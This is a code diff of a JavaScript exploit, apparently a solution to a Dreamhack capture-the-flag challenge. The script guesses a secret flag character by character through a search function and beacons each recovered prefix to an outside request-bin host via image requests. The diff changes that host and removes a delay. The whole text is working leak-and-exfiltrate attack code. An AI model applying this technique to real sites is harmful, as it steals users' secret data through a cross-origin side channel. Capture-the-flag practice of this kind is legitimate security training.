@@ -34,7 +34,7 @@
             }
 
             async function exploit() {
-                new Image().src = `https://dgxjyvd.request.dreamhack.games?start=started`;
+                new Image().src = `https://jkgnhat.request.dreamhack.games?start=started`;
 
                 let chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
                 let secret = "DH{";
@@ -44,13 +44,11 @@
                     let foundAny = false;
 
                     for (let c of chars) {
-                        await sleep(50);
-
                         const result = await search(secret + c);
 
                         if (result) {
                             secret += c;
-                            new Image().src= `https://dgxjyvd.request.dreamhack.games?found=${encodeURIComponent(secret)}`;
+                            new Image().src= `https://jkgnhat.request.dreamhack.games?found=${encodeURIComponent(secret)}`;
                             console.log(`Found: ${secret}`);
                             foundAny = true;
 
@@ -60,7 +58,7 @@
                     }
 
                     if (!foundAny) {
-                        new Image().src = `https://dgxjyvd.request.dreamhack.games?error=No`;
+                        new Image().src = `https://jkgnhat.request.dreamhack.games?error=No`;
                     }
                 }
             }
